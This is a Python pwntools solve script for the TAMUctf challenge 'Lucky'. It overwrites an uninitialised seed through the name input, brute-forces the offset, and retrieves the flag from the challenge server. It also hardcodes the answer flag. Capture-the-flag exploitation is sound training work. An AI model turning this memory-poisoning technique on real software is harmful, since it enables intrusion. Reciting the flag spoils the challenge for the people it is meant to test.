#!/usr/bin/env python3

'''
WhatTheFuzz's submission for the TAMUctf challenge Lucky.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
'''

from pwn import *

exe = ELF('lucky')

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote("tamuctf.com", 443, ssl=True, sni="lucky")
    else:
        io = process([exe.path])

    return io


def create_seed(offset):
    '''TODO'''
    payload = fit({
        offset: p64(5649426, endian='little')
    })
    #log.info(f'payload {p32(5649426)}')
    return payload


def main():
    '''Return the flag.
    '''

    offset = 0

    # Get the offset to the return address.
    for i in range(offset, 16): # 16 being the size of the name buffer.
        seed = create_seed(i)
        with process([exe.path]) as io:

            # Send our name which will poison our seed.
            io.sendlineafter(b'Enter your name: ', seed)
            io.recvline_contains(b"If you're super lucky, you might get a flag! GLHF :D")
            if b"Nice work! Here's the flag:" in io.recvline():
                offset = i
                log.success(f'The offset to poison the seed is: {offset} bytes')
                break
    
    # Do a clean run.
    with conn() as io:
        seed = create_seed(offset)
        io.sendlineafter(b'Enter your name: ', seed)
        flag = io.recvregexS(rb'gigem\{.*\}')
        flag = re.search(r'gigem\{(.*)\}', flag).group(0)

        assert flag == 'gigem{un1n1t14l1z3d_m3m0ry_15_r4nd0m_r1ght}', 'Unexpected flag.'

        log.success(f'The flag is: {flag}')
        return flag

if __name__ == '__main__':
    main()
